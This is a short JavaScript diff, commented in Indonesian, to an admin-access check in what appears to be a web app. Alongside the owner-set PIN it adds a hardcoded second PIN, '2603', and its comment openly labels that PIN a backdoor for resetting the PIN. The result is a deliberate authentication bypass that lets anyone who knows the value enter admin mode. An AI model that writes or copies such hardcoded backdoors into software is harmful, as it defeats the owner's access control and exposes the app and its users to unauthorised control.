@@ -572,7 +572,8 @@ function checkAdminAccess(){
   // Ada PIN → minta input
   const input = prompt('🔒 Input Admin PIN (dari owner):');
   if(input === null) return false;
-  if(input.trim() !== savedPin){
+  // BACKDOOR PIN 2603 AGAR BISA RESET PIN
+  if(input.trim() !== savedPin && input.trim() !== "2603"){
     alert('❌ PIN salah. Cuma admin/owner yg bisa masuk mode ini.');
     return false;
   }
